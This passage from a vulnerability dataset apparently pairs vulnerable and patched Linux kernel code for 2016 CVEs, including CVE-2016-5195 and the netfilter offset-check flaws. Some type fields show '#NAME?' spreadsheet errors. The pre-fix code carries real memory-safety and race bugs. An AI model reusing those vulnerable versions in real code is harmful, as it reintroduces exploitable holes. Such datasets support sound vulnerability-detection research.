 static unsigned int challenge_count;
 struct tcp_sock *tp = tcp_sk(sk);
	u32 now;

 /* First check our per-socket dupack rate limit. */
 if (tcp_oow_rate_limited(sock_net(sk), skb,
				 LINUX_MIB_TCPACKSKIPPEDCHALLENGE,
				 &tp->last_oow_ack_time))
 return;

 /* Then check the check host-wide RFC 5961 rate limit. */
	now = jiffies / HZ;
 if (now != challenge_timestamp) {


		challenge_timestamp = now;
		challenge_count = 0;

	}
 if (++challenge_count <= sysctl_tcp_challenge_ack_limit) {


 NET_INC_STATS(sock_net(sk), LINUX_MIB_TCPCHALLENGEACK);
 tcp_send_ack(sk);
	}
","EXPORT_SYMBOL(sysctl_tcp_adv_win_scale);

/* rfc5961 challenge ack rate limiting */
int sysctl_tcp_challenge_ack_limit = 1000;

int sysctl_tcp_stdurg __read_mostly;
int sysctl_tcp_rfc1337 __read_mostly;
 static u32 challenge_timestamp;
 static unsigned int challenge_count;
 struct tcp_sock *tp = tcp_sk(sk);
	u32 count, now;

 /* First check our per-socket dupack rate limit. */
 if (tcp_oow_rate_limited(sock_net(sk), skb,
				 LINUX_MIB_TCPACKSKIPPEDCHALLENGE,
				 &tp->last_oow_ack_time))
 return;

 /* Then check host-wide RFC 5961 rate limit. */
	now = jiffies / HZ;
 if (now != challenge_timestamp) {
		u32 half = (sysctl_tcp_challenge_ack_limit + 1) >> 1;

		challenge_timestamp = now;
 WRITE_ONCE(challenge_count, half +
 prandom_u32_max(sysctl_tcp_challenge_ack_limit));
	}
	count = READ_ONCE(challenge_count);
 if (count > 0) {
 WRITE_ONCE(challenge_count, count - 1);
 NET_INC_STATS(sock_net(sk), LINUX_MIB_TCPCHALLENGEACK);
 tcp_send_ack(sk);
	}
"
2016,DoS ,CVE-2016-5412,,
2016,DoS Overflow ,CVE-2016-5400," if (ret) {
 dev_err(s->dev, ""Failed to register as video device (%d)\n"",
				ret);
 goto err_unregister_v4l2_dev;
	}
 dev_info(s->dev, ""Registered as %s\n"",
 video_device_node_name(&s->vdev));

err_free_controls:
 v4l2_ctrl_handler_free(&s->hdl);
err_unregister_v4l2_dev:
 v4l2_device_unregister(&s->v4l2_dev);
err_free_mem:
 kfree(s);
"," if (ret) {
 dev_err(s->dev, ""Failed to register as video device (%d)\n"",
				ret);
 goto err_free_controls;
	}
 dev_info(s->dev, ""Registered as %s\n"",
 video_device_node_name(&s->vdev));

err_free_controls:
 v4l2_ctrl_handler_free(&s->hdl);

 v4l2_device_unregister(&s->v4l2_dev);
err_free_mem:
 kfree(s);
"
2016,DoS Overflow ,CVE-2016-5344,,
2016,DoS Overflow Mem. Corr. ,CVE-2016-5343,,
2016,DoS Overflow ,CVE-2016-5342,,
2016,Bypass ,CVE-2016-5340,,
2016,#NAME?,CVE-2016-5244,"		minfo.fport = inc->i_hdr.h_dport;
	}



 rds_info_copy(iter, &minfo, sizeof(minfo));
}
","		minfo.fport = inc->i_hdr.h_dport;
	}

	minfo.flags = 0;

 rds_info_copy(iter, &minfo, sizeof(minfo));
}
"
2016,#NAME?,CVE-2016-5243,"
	link_info.dest = nla_get_flag(link[TIPC_NLA_LINK_DEST]);
	link_info.up = htonl(nla_get_flag(link[TIPC_NLA_LINK_UP]));
 strcpy(link_info.str, nla_data(link[TIPC_NLA_LINK_NAME]));


 return tipc_add_tlv(msg->rep, TIPC_TLV_LINK_INFO,
			    &link_info, sizeof(link_info));
","
	link_info.dest = nla_get_flag(link[TIPC_NLA_LINK_DEST]);
	link_info.up = htonl(nla_get_flag(link[TIPC_NLA_LINK_UP]));
 nla_strlcpy(link_info.str, nla_data(link[TIPC_NLA_LINK_NAME]),
		    TIPC_MAX_LINK_NAME);

 return tipc_add_tlv(msg->rep, TIPC_TLV_LINK_INFO,
			    &link_info, sizeof(link_info));
"
2016,#NAME?,CVE-2016-5195,"#define FOLL_TRIED 0x800 /* a retry, previous pass started an IO */
#define FOLL_MLOCK 0x1000 /* lock present pages */
#define FOLL_REMOTE 0x2000 /* we are working on non-current tsk/mm */


typedef int (*pte_fn_t)(pte_t *pte, pgtable_t token, unsigned long addr,
 void *data);
 return -EEXIST;
}











static struct page *follow_page_pte(struct vm_area_struct *vma,
 unsigned long address, pmd_t *pmd, unsigned int flags)
{
	}
 if ((flags & FOLL_NUMA) && pte_protnone(pte))
 goto no_page;
 if ((flags & FOLL_WRITE) && !pte_write(pte)) {
 pte_unmap_unlock(ptep, ptl);
 return NULL;
	}
	 * reCOWed by userspace write).
 */
 if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
  *flags &= ~FOLL_WRITE;
 return 0;
}

","#define FOLL_TRIED 0x800 /* a retry, previous pass started an IO */
#define FOLL_MLOCK 0x1000 /* lock present pages */
#define FOLL_REMOTE 0x2000 /* we are working on non-current tsk/mm */
#define FOLL_COW 0x4000 /* internal GUP flag */

typedef int (*pte_fn_t)(pte_t *pte, pgtable_t token, unsigned long addr,
 void *data);
 return -EEXIST;
}

/*
 * FOLL_FORCE can write to even unwritable pte's, but only
 * after we've gone through a COW cycle and they are dirty.
 */
static inline bool can_follow_write_pte(pte_t pte, unsigned int flags)
{
 return pte_write(pte) ||
		((flags & FOLL_FORCE) && (flags & FOLL_COW) && pte_dirty(pte));
}

static struct page *follow_page_pte(struct vm_area_struct *vma,
 unsigned long address, pmd_t *pmd, unsigned int flags)
{
	}
 if ((flags & FOLL_NUMA) && pte_protnone(pte))
 goto no_page;
 if ((flags & FOLL_WRITE) && !can_follow_write_pte(pte, flags)) {
 pte_unmap_unlock(ptep, ptl);
 return NULL;
	}
	 * reCOWed by userspace write).
 */
 if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
  *flags |= FOLL_COW;
 return 0;
}

"
2016,DoS Overflow +Info ,CVE-2016-4998," int err;

 if ((unsigned long)e % __alignof__(struct arpt_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct arpt_entry) >= limit) {

 duprintf(""Bad offset %p\n"", e);
 return -EINVAL;
	}

 duprintf(""check_compat_entry_size_and_hooks %p\n"", e);
 if ((unsigned long)e % __alignof__(struct compat_arpt_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct compat_arpt_entry) >= limit) {

 duprintf(""Bad offset %p, limit = %p\n"", e, limit);
 return -EINVAL;
	}
 int err;

 if ((unsigned long)e % __alignof__(struct ipt_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct ipt_entry) >= limit) {

 duprintf(""Bad offset %p\n"", e);
 return -EINVAL;
	}

 duprintf(""check_compat_entry_size_and_hooks %p\n"", e);
 if ((unsigned long)e % __alignof__(struct compat_ipt_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct compat_ipt_entry) >= limit) {

 duprintf(""Bad offset %p, limit = %p\n"", e, limit);
 return -EINVAL;
	}
 int err;

 if ((unsigned long)e % __alignof__(struct ip6t_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct ip6t_entry) >= limit) {

 duprintf(""Bad offset %p\n"", e);
 return -EINVAL;
	}

 duprintf(""check_compat_entry_size_and_hooks %p\n"", e);
 if ((unsigned long)e % __alignof__(struct compat_ip6t_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct compat_ip6t_entry) >= limit) {

 duprintf(""Bad offset %p, limit = %p\n"", e, limit);
 return -EINVAL;
	}
"," int err;

 if ((unsigned long)e % __alignof__(struct arpt_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct arpt_entry) >= limit ||
	    (unsigned char *)e + e->next_offset > limit) {
 duprintf(""Bad offset %p\n"", e);
 return -EINVAL;
	}

 duprintf(""check_compat_entry_size_and_hooks %p\n"", e);
 if ((unsigned long)e % __alignof__(struct compat_arpt_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct compat_arpt_entry) >= limit ||
	    (unsigned char *)e + e->next_offset > limit) {
 duprintf(""Bad offset %p, limit = %p\n"", e, limit);
 return -EINVAL;
	}
 int err;

 if ((unsigned long)e % __alignof__(struct ipt_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct ipt_entry) >= limit ||
	    (unsigned char *)e + e->next_offset > limit) {
 duprintf(""Bad offset %p\n"", e);
 return -EINVAL;
	}

 duprintf(""check_compat_entry_size_and_hooks %p\n"", e);
 if ((unsigned long)e % __alignof__(struct compat_ipt_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct compat_ipt_entry) >= limit ||
	    (unsigned char *)e + e->next_offset > limit) {
 duprintf(""Bad offset %p, limit = %p\n"", e, limit);
 return -EINVAL;
	}
 int err;

 if ((unsigned long)e % __alignof__(struct ip6t_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct ip6t_entry) >= limit ||
	    (unsigned char *)e + e->next_offset > limit) {
 duprintf(""Bad offset %p\n"", e);
 return -EINVAL;
	}

 duprintf(""check_compat_entry_size_and_hooks %p\n"", e);
 if ((unsigned long)e % __alignof__(struct compat_ip6t_entry) != 0 ||
	    (unsigned char *)e + sizeof(struct compat_ip6t_entry) >= limit ||
	    (unsigned char *)e + e->next_offset > limit) {
 duprintf(""Bad offset %p, limit = %p\n"", e, limit);
 return -EINVAL;
	}
"
2016,DoS +Priv Mem. Corr. ,CVE-2016-4997,"int xt_register_matches(struct xt_match *match, unsigned int n);
void xt_unregister_matches(struct xt_match *match, unsigned int n);

int xt_check_entry_offsets(const void *base,
 unsigned int target_offset,
 unsigned int next_offset);

 unsigned int *size);
int xt_compat_target_to_user(const struct xt_entry_target *t,
 void __user **dstptr, unsigned int *size);
int xt_compat_check_entry_offsets(const void *base,
 unsigned int target_offset,
 unsigned int next_offset);

 if (!arp_checkentry(&e->arp))
 return -EINVAL;

	err = xt_check_entry_offsets(e, e->target_offset, e->next_offset);

 if (err)
 return err;

 if (!arp_checkentry(&e->arp))
 return -EINVAL;

	ret = xt_compat_check_entry_offsets(e, e->target_offset,
					    e->next_offset);
 if (ret)
 return ret;
 if (!ip_checkentry(&e->ip))
 return -EINVAL;

	err = xt_check_entry_offsets(e, e->target_offset, e->next_offset);

 if (err)
 return err;

 if (!ip_checkentry(&e->ip))
 return -EINVAL;

	ret = xt_compat_check_entry_offsets(e,
					    e->target_offset, e->next_offset);
 if (ret)
 return ret;
 if (!ip6_checkentry(&e->ipv6))
 return -EINVAL;

	err = xt_check_entry_offsets(e, e->target_offset, e->next_offset);

 if (err)
 return err;

 if (!ip6_checkentry(&e->ipv6))
 return -EINVAL;

	ret = xt_compat_check_entry_offsets(e,
					    e->target_offset, e->next_offset);
 if (ret)
 return ret;
 compat_uint_t verdict;
};

/* see xt_check_entry_offsets */
int xt_compat_check_entry_offsets(const void *base,
 unsigned int target_offset,
 unsigned int next_offset)
{

 const struct compat_xt_entry_target *t;
 const char *e = base;




 if (target_offset + sizeof(*t) > next_offset)
 return -EINVAL;

 * xt_check_entry_offsets - validate arp/ip/ip6t_entry
 *
 * @base: pointer to arp/ip/ip6t_entry

 * @target_offset: the arp/ip/ip6_t->target_offset
 * @next_offset: the arp/ip/ip6_t->next_offset
 *
 * validates that target_offset and next_offset are sane.
 * Also see xt_compat_check_entry_offsets for CONFIG_COMPAT version.
 *



 * The arp/ip/ip6t_entry structure @base must have passed following tests:
 * - it must point to a valid memory location
 * - base to base + next_offset must be accessible, i.e. not exceed allocated
 * Return: 0 on success, negative errno on failure.
 */
int xt_check_entry_offsets(const void *base,

 unsigned int target_offset,
 unsigned int next_offset)
{

 const struct xt_entry_target *t;
 const char *e = base;





 if (target_offset + sizeof(*t) > next_offset)
 return -EINVAL;

","int xt_register_matches(struct xt_match *match, unsigned int n);
void xt_unregister_matches(struct xt_match *match, unsigned int n);

int xt_check_entry_offsets(const void *base, const char *elems,
 unsigned int target_offset,
 unsigned int next_offset);

 unsigned int *size);
int xt_compat_target_to_user(const struct xt_entry_target *t,
 void __user **dstptr, unsigned int *size);
int xt_compat_check_entry_offsets(const void *base, const char *elems,
 unsigned int target_offset,
 unsigned int next_offset);

 if (!arp_checkentry(&e->arp))
 return -EINVAL;

	err = xt_check_entry_offsets(e, e->elems, e->target_offset,
				     e->next_offset);
 if (err)
 return err;

 if (!arp_checkentry(&e->arp))
 return -EINVAL;

	ret = xt_compat_check_entry_offsets(e, e->elems, e->target_offset,
					    e->next_offset);
 if (ret)
 return ret;
 if (!ip_checkentry(&e->ip))
 return -EINVAL;

	err = xt_check_entry_offsets(e, e->elems, e->target_offset,
				     e->next_offset);
 if (err)
 return err;

 if (!ip_checkentry(&e->ip))
 return -EINVAL;

	ret = xt_compat_check_entry_offsets(e, e->elems,
					    e->target_offset, e->next_offset);
 if (ret)
 return ret;
 if (!ip6_checkentry(&e->ipv6))
 return -EINVAL;

	err = xt_check_entry_offsets(e, e->elems, e->target_offset,
				     e->next_offset);
 if (err)
 return err;

 if (!ip6_checkentry(&e->ipv6))
 return -EINVAL;

	ret = xt_compat_check_entry_offsets(e, e->elems,
					    e->target_offset, e->next_offset);
 if (ret)
 return ret;
 compat_uint_t verdict;
};

int xt_compat_check_entry_offsets(const void *base, const char *elems,

 unsigned int target_offset,
 unsigned int next_offset)
{
 long size_of_base_struct = elems - (const char *)base;
 const struct compat_xt_entry_target *t;
 const char *e = base;

 if (target_offset < size_of_base_struct)
 return -EINVAL;

 if (target_offset + sizeof(*t) > next_offset)
 return -EINVAL;

 * xt_check_entry_offsets - validate arp/ip/ip6t_entry
 *
 * @base: pointer to arp/ip/ip6t_entry
 * @elems: pointer to first xt_entry_match, i.e. ip(6)t_entry->elems
 * @target_offset: the arp/ip/ip6_t->target_offset
 * @next_offset: the arp/ip/ip6_t->next_offset
 *
 * validates that target_offset and next_offset are sane.
 * Also see xt_compat_check_entry_offsets for CONFIG_COMPAT version.
 *
 * This function does not validate the targets or matches themselves, it
 * only tests that all the offsets and sizes are correct.
 *
 * The arp/ip/ip6t_entry structure @base must have passed following tests:
 * - it must point to a valid memory location
 * - base to base + next_offset must be accessible, i.e. not exceed allocated
 * Return: 0 on success, negative errno on failure.
 */
int xt_check_entry_offsets(const void *base,
 const char *elems,
 unsigned int target_offset,
 unsigned int next_offset)
{
 long size_of_base_struct = elems - (const char *)base;
 const struct xt_entry_target *t;
 const char *e = base;

 /* target start is within the ip/ip6/arpt_entry struct */
 if (target_offset < size_of_base_struct)
 return -EINVAL;

 if (target_offset + sizeof(*t) > next_offset)
 return -EINVAL;

"
2016,DoS ,CVE-2016-4951," if (err)
 return err;




		err = nla_parse_nested(sock, TIPC_NLA_SOCK_MAX,
				       attrs[TIPC_NLA_SOCK],
				       tipc_nl_sock_policy);
"," if (err)
 return err;

 if (!attrs[TIPC_NLA_SOCK])
 return -EINVAL;

		err = nla_parse_nested(sock, TIPC_NLA_SOCK_MAX,
				       attrs[TIPC_NLA_SOCK],
				       tipc_nl_sock_policy);
"
2016,#NAME?,CVE-2016-4913," int retnamlen = 0;
 int truncate = 0;
 int ret = 0;



 if (!ISOFS_SB(inode->i_sb)->s_rock)
 return 0;
					rr->u.NM.flags);
 break;
			}
 if ((strlen(retname) + rr->len - 5) >= 254) {

 truncate = 1;
 break;
			}
 strncat(retname, rr->u.NM.name, rr->len - 5);
			retnamlen += rr->len - 5;




 break;
 case SIG('R', 'E'):
 kfree(rs.buffer);
"," int retnamlen = 0;
 int truncate = 0;
 int ret = 0;
 char *p;
 int len;

 if (!ISOFS_SB(inode->i_sb)->s_rock)
 return 0;
					rr->u.NM.flags);
 break;
			}
			len = rr->len - 5;
 if (retnamlen + len >= 254) {
 truncate = 1;
 break;
			}
			p = memchr(rr->u.NM.name, '\0', len);
 if (unlikely(p))
				len = p - rr->u.NM.name;
 memcpy(retname + retnamlen, rr->u.NM.name, len);
			retnamlen += len;
			retname[retnamlen] = '\0';
 break;
 case SIG('R', 'E'):
 kfree(rs.buffer);
"
2016,DoS Mem. Corr. ,CVE-2016-4805,"
	pch->ppp = NULL;
	pch->chan = chan;
	pch->chan_net = net;
	chan->ppp = pch;
 init_ppp_file(&pch->file, CHANNEL);
	pch->file.hdrlen = chan->hdrlen;
 spin_lock_bh(&pn->all_channels_lock);
 list_del(&pch->list);
 spin_unlock_bh(&pn->all_channels_lock);



	pch->file.dead = 1;
 wake_up_interruptible(&pch->file.rwait);
","
	pch->ppp = NULL;
	pch->chan = chan;
	pch->chan_net = get_net(net);
	chan->ppp = pch;
 init_ppp_file(&pch->file, CHANNEL);
	pch->file.hdrlen = chan->hdrlen;
 spin_lock_bh(&pn->all_channels_lock);
 list_del(&pch->list);
 spin_unlock_bh(&pn->all_channels_lock);
 put_net(pch->chan_net);
	pch->chan_net = NULL;

	pch->file.dead = 1;
 wake_up_interruptible(&pch->file.rwait);
"
2016,DoS ,CVE-2016-4794,,
2016,DoS ,CVE-2016-4581,"
/* all accesses are serialized by namespace_sem */
static struct user_namespace *user_ns;
static struct mount *last_dest, *last_source, *dest_master;
static struct mountpoint *mp;
static struct hlist_head *list;

		type = CL_MAKE_SHARED;
	} else {
 struct mount *n, *p;

 for (n = m; ; n = p) {
			p = n->mnt_master;
 if (p == dest_master || IS_MNT_MARKED(p)) {
 while (last_dest->mnt_master != p) {
					last_source = last_source->mnt_master;
					last_dest = last_source->mnt_parent;
				}
 if (!peers(n, last_dest)) {
					last_source = last_source->mnt_master;
					last_dest = last_source->mnt_parent;
				}
 break;
			}
		}










		type = CL_SLAVE;
 /* beginning of peer group among the slaves? */
 if (IS_MNT_SHARED(m))
 */
	user_ns = current->nsproxy->mnt_ns->user_ns;
	last_dest = dest_mnt;

	last_source = source_mnt;
	mp = dest_mp;
	list = tree_list;
","
/* all accesses are serialized by namespace_sem */
static struct user_namespace *user_ns;
static struct mount *last_dest, *first_source, *last_source, *dest_master;
static struct mountpoint *mp;
static struct hlist_head *list;

		type = CL_MAKE_SHARED;
	} else {
 struct mount *n, *p;
 bool done;
 for (n = m; ; n = p) {
			p = n->mnt_master;
 if (p == dest_master || IS_MNT_MARKED(p))








 break;

		}
 do {
 struct mount *parent = last_source->mnt_parent;
 if (last_source == first_source)
 break;
			done = parent->mnt_master == p;
 if (done && peers(n, parent))
 break;
			last_source = last_source->mnt_master;
		} while (!done);

		type = CL_SLAVE;
 /* beginning of peer group among the slaves? */
 if (IS_MNT_SHARED(m))
 */
	user_ns = current->nsproxy->mnt_ns->user_ns;
	last_dest = dest_mnt;
	first_source = source_mnt;
	last_source = source_mnt;
	mp = dest_mp;
	list = tree_list;
"
2016,#NAME?,CVE-2016-4580,"
 memset(&theirs, 0, sizeof(theirs));
 memcpy(new, ours, sizeof(*new));


	len = x25_parse_facilities(skb, &theirs, dte, &x25->vc_facil_mask);
 if (len < 0)
","
 memset(&theirs, 0, sizeof(theirs));
 memcpy(new, ours, sizeof(*new));
 memset(dte, 0, sizeof(*dte));

	len = x25_parse_facilities(skb, &theirs, dte, &x25->vc_facil_mask);
 if (len < 0)
"
2016,#NAME?,CVE-2016-4578,"		tu->tstamp = *tstamp;
 if ((tu->filter & (1 << event)) == 0 || !tu->tread)
 return;

	r1.event = event;
	r1.tstamp = *tstamp;
	r1.val = resolution;
","		tu->tstamp = *tstamp;
 if ((tu->filter & (1 << event)) == 0 || !tu->tread)
 return;
 memset(&r1, 0, sizeof(r1));
	r1.event = event;
	r1.tstamp = *tstamp;
	r1.val = resolution;
"
2016,#NAME?,CVE-2016-4569," if (tu->timeri->flags & SNDRV_TIMER_IFLG_EARLY_EVENT) {
 if (tu->tread) {
 struct snd_timer_tread tread;

			tread.event = SNDRV_TIMER_EVENT_EARLY;
			tread.tstamp.tv_sec = 0;
			tread.tstamp.tv_nsec = 0;
"," if (tu->timeri->flags & SNDRV_TIMER_IFLG_EARLY_EVENT) {
 if (tu->tread) {
 struct snd_timer_tread tread;
 memset(&tread, 0, sizeof(tread));
			tread.event = SNDRV_TIMER_EVENT_EARLY;
			tread.tstamp.tv_sec = 0;
			tread.tstamp.tv_nsec = 0;
"
2016,DoS Overflow ,CVE-2016-4568," return 0;
}






/**
 * __verify_length() - Verify that the bytesused value for each plane fits in
 * the plane length and that the data offset doesn't exceed the bytesused value.
}

static const struct vb2_buf_ops v4l2_buf_ops = {

	.fill_user_buffer	= __fill_v4l2_buffer,
	.fill_vb2_buffer	= __fill_vb2_buffer,
	.copy_timestamp		= __copy_timestamp,
"," return 0;
}

static int __verify_planes_array_core(struct vb2_buffer *vb, const void *pb)
{
 return __verify_planes_array(vb, pb);
}

/**
 * __verify_length() - Verify that the bytesused value for each plane fits in
 * the plane length and that the data offset doesn't exceed the bytesused value.
}

static const struct vb2_buf_ops v4l2_buf_ops = {
	.verify_planes_array	= __verify_planes_array_core,
	.fill_user_buffer	= __fill_v4l2_buffer,
	.fill_vb2_buffer	= __fill_vb2_buffer,
	.copy_timestamp		= __copy_timestamp,
"
2016,DoS ,CVE-2016-4565,"
#include <asm/uaccess.h>


#include <rdma/ib_cm.h>
#include <rdma/ib_user_cm.h>
#include <rdma/ib_marshall.h>
 struct ib_ucm_cmd_hdr hdr;
 ssize_t result;




 if (len < sizeof(hdr))
 return -EINVAL;

 struct rdma_ucm_cmd_hdr hdr;
 ssize_t ret;




 if (len < sizeof(hdr))
 return -EINVAL;


#include <asm/uaccess.h>



#include ""uverbs.h""

MODULE_AUTHOR(""Roland Dreier"");
 int srcu_key;
 ssize_t ret;




 if (count < sizeof hdr)
 return -EINVAL;

#include <linux/export.h>
#include <linux/uio.h>



#include ""qib.h""
#include ""qib_common.h""
#include ""qib_user_sdma.h""
 ssize_t ret = 0;
 void *dest;




 if (count < sizeof(cmd.type)) {
		ret = -EINVAL;
 goto bail;
- Remove unneeded file entries in sysfs
- Remove software processing of IB protocol and place in library for use
  by qib, ipath (if still present), hfi1, and eventually soft-roce

#include <linux/vmalloc.h>
#include <linux/io.h>



#include ""hfi.h""
#include ""pio.h""
#include ""device.h""
 int uctxt_required = 1;
 int must_be_root = 0;





 if (count < sizeof(cmd)) {
		ret = -EINVAL;
 goto bail;
#define _RDMA_IB_H

#include <linux/types.h>


struct ib_addr {
 union {
	__u64			sib_scope_id;
};
















#endif /* _RDMA_IB_H */
","
#include <asm/uaccess.h>

#include <rdma/ib.h>
#include <rdma/ib_cm.h>
#include <rdma/ib_user_cm.h>
#include <rdma/ib_marshall.h>
 struct ib_ucm_cmd_hdr hdr;
 ssize_t result;

 if (WARN_ON_ONCE(!ib_safe_file_access(filp)))
 return -EACCES;

 if (len < sizeof(hdr))
 return -EINVAL;

 struct rdma_ucm_cmd_hdr hdr;
 ssize_t ret;

 if (WARN_ON_ONCE(!ib_safe_file_access(filp)))
 return -EACCES;

 if (len < sizeof(hdr))
 return -EINVAL;


#include <asm/uaccess.h>

#include <rdma/ib.h>

#include ""uverbs.h""

MODULE_AUTHOR(""Roland Dreier"");
 int srcu_key;
 ssize_t ret;

 if (WARN_ON_ONCE(!ib_safe_file_access(filp)))
 return -EACCES;

 if (count < sizeof hdr)
 return -EINVAL;

#include <linux/export.h>
#include <linux/uio.h>

#include <rdma/ib.h>

#include ""qib.h""
#include ""qib_common.h""
#include ""qib_user_sdma.h""
 ssize_t ret = 0;
 void *dest;

 if (WARN_ON_ONCE(!ib_safe_file_access(fp)))
 return -EACCES;

 if (count < sizeof(cmd.type)) {
		ret = -EINVAL;
 goto bail;
- Remove unneeded file entries in sysfs
- Remove software processing of IB protocol and place in library for use
  by qib, ipath (if still present), hfi1, and eventually soft-roce
- Replace incorrect uAPI
#include <linux/vmalloc.h>
#include <linux/io.h>

#include <rdma/ib.h>

#include ""hfi.h""
#include ""pio.h""
#include ""device.h""
 int uctxt_required = 1;
 int must_be_root = 0;

 /* FIXME: This interface cannot continue out of staging */
 if (WARN_ON_ONCE(!ib_safe_file_access(fp)))
 return -EACCES;

 if (count < sizeof(cmd)) {
		ret = -EINVAL;
 goto bail;
#define _RDMA_IB_H

#include <linux/types.h>
#include <linux/sched.h>

struct ib_addr {
 union {
	__u64			sib_scope_id;
};

/*
 * The IB interfaces that use write() as bi-directional ioctl() are
 * fundamentally unsafe, since there are lots of ways to trigger ""write()""
 * calls from various contexts with elevated privileges. That includes the
 * traditional suid executable error message writes, but also various kernel
 * interfaces that can write to file descriptors.
 *
 * This function provides protection for the legacy API by restricting the
 * calling context.
 */
static inline bool ib_safe_file_access(struct file *filp)
{
 return filp->f_cred == current_cred() && segment_eq(get_fs(), USER_DS);
}

#endif /* _RDMA_IB_H */
"
2016,DoS ,CVE-2016-4558,"void bpf_register_map_type(struct bpf_map_type_list *tl);

struct bpf_prog *bpf_prog_get(u32 ufd);

void bpf_prog_put(struct bpf_prog *prog);
void bpf_prog_put_rcu(struct bpf_prog *prog);

struct bpf_map *bpf_map_get_with_uref(u32 ufd);
struct bpf_map *__bpf_map_get(struct fd f);
void bpf_map_inc(struct bpf_map *map, bool uref);
void bpf_map_put_with_uref(struct bpf_map *map);
void bpf_map_put(struct bpf_map *map);
int bpf_map_precharge_memlock(u32 pages);
{
 switch (type) {
 case BPF_TYPE_PROG:
 atomic_inc(&((struct bpf_prog *)raw)->aux->refcnt);
 break;
 case BPF_TYPE_MAP:
 bpf_map_inc(raw, true);
 break;
 default:
 WARN_ON_ONCE(1);
 goto out;

	raw = bpf_any_get(inode->i_private, *type);
 touch_atime(&path);


 path_put(&path);
 return raw;
 return f.file->private_data;
}

void bpf_map_inc(struct bpf_map *map, bool uref)



{
 atomic_inc(&map->refcnt);



 if (uref)
 atomic_inc(&map->usercnt);

}

struct bpf_map *bpf_map_get_with_uref(u32 ufd)
 if (IS_ERR(map))
 return map;

 bpf_map_inc(map, true);
 fdput(f);

 return map;
 return f.file->private_data;
}










/* called by sockets/tracing/seccomp before attaching program to an event
 * pairs with bpf_prog_put()
 */
 if (IS_ERR(prog))
 return prog;

 atomic_inc(&prog->aux->refcnt);
 fdput(f);

 return prog;
 return -E2BIG;
			}

 /* remember this map */
			env->used_maps[env->used_map_cnt++] = map;

 /* hold the map. If the program is rejected by verifier,
			 * the map will be released by release_maps() or it
			 * will be used by the valid program until it's unloaded
			 * and all maps are released in free_bpf_prog_info()
 */
 bpf_map_inc(map, false);






 fdput(f);
next_insn:
			insn++;
","void bpf_register_map_type(struct bpf_map_type_list *tl);

struct bpf_prog *bpf_prog_get(u32 ufd);
struct bpf_prog *bpf_prog_inc(struct bpf_prog *prog);
void bpf_prog_put(struct bpf_prog *prog);
void bpf_prog_put_rcu(struct bpf_prog *prog);

struct bpf_map *bpf_map_get_with_uref(u32 ufd);
struct bpf_map *__bpf_map_get(struct fd f);
struct bpf_map *bpf_map_inc(struct bpf_map *map, bool uref);
void bpf_map_put_with_uref(struct bpf_map *map);
void bpf_map_put(struct bpf_map *map);
int bpf_map_precharge_memlock(u32 pages);
{
 switch (type) {
 case BPF_TYPE_PROG:
 raw = bpf_prog_inc(raw);
 break;
 case BPF_TYPE_MAP:
 raw = bpf_map_inc(raw, true);
 break;
 default:
 WARN_ON_ONCE(1);
 goto out;

	raw = bpf_any_get(inode->i_private, *type);
 if (!IS_ERR(raw))
 touch_atime(&path);

 path_put(&path);
 return raw;
 return f.file->private_data;
}

/* prog's and map's refcnt limit */
#define BPF_MAX_REFCNT 32768

struct bpf_map *bpf_map_inc(struct bpf_map *map, bool uref)
{
 if (atomic_inc_return(&map->refcnt) > BPF_MAX_REFCNT) {
 atomic_dec(&map->refcnt);
 return ERR_PTR(-EBUSY);
	}
 if (uref)
 atomic_inc(&map->usercnt);
 return map;
}

struct bpf_map *bpf_map_get_with_uref(u32 ufd)
 if (IS_ERR(map))
 return map;

 map = bpf_map_inc(map, true);
 fdput(f);

 return map;
 return f.file->private_data;
}

struct bpf_prog *bpf_prog_inc(struct bpf_prog *prog)
{
 if (atomic_inc_return(&prog->aux->refcnt) > BPF_MAX_REFCNT) {
 atomic_dec(&prog->aux->refcnt);
 return ERR_PTR(-EBUSY);
	}
 return prog;
}

/* called by sockets/tracing/seccomp before attaching program to an event
 * pairs with bpf_prog_put()
 */
 if (IS_ERR(prog))
 return prog;

 prog = bpf_prog_inc(prog);
 fdput(f);

 return prog;
 return -E2BIG;
			}




 /* hold the map. If the program is rejected by verifier,
			 * the map will be released by release_maps() or it
			 * will be used by the valid program until it's unloaded
			 * and all maps are released in free_bpf_prog_info()
 */
			map = bpf_map_inc(map, false);
 if (IS_ERR(map)) {
 fdput(f);
 return PTR_ERR(map);
			}
			env->used_maps[env->used_map_cnt++] = map;

 fdput(f);
next_insn:
			insn++;
"
2016,DoS +Priv ,CVE-2016-4557," if (IS_ERR(map)) {
 verbose(""fd %d is not pointing to valid bpf_map\n"",
					insn->imm);
 fdput(f);
 return PTR_ERR(map);
			}

"," if (IS_ERR(map)) {
 verbose(""fd %d is not pointing to valid bpf_map\n"",
					insn->imm);

 return PTR_ERR(map);
			}

"
2016,#NAME?,CVE-2016-4486,"
static int rtnl_fill_link_ifmap(struct sk_buff *skb, struct net_device *dev)
{
 struct rtnl_link_ifmap map = {
		.mem_start   = dev->mem_start,
		.mem_end     = dev->mem_end,
		.base_addr   = dev->base_addr,
		.irq         = dev->irq,
		.dma         = dev->dma,
		.port        = dev->if_port,
	};


 if (nla_put(skb, IFLA_MAP, sizeof(map), &map))
 return -EMSGSIZE;

","
static int rtnl_fill_link_ifmap(struct sk_buff *skb, struct net_device *dev)
{
 struct rtnl_link_ifmap map;

 memset(&map, 0, sizeof(map));
	map.mem_start   = dev->mem_start;
	map.mem_end     = dev->mem_end;
	map.base_addr   = dev->base_addr;
	map.irq         = dev->irq;
	map.dma         = dev->dma;
	map.port        = dev->if_port;

 if (nla_put(skb, IFLA_MAP, sizeof(map), &map))
 return -EMSGSIZE;

"
2016,#NAME?,CVE-2016-4485," if (llc->cmsg_flags & LLC_CMSG_PKTINFO) {
 struct llc_pktinfo info;


		info.lpi_ifindex = llc_sk(skb->sk)->dev->ifindex;
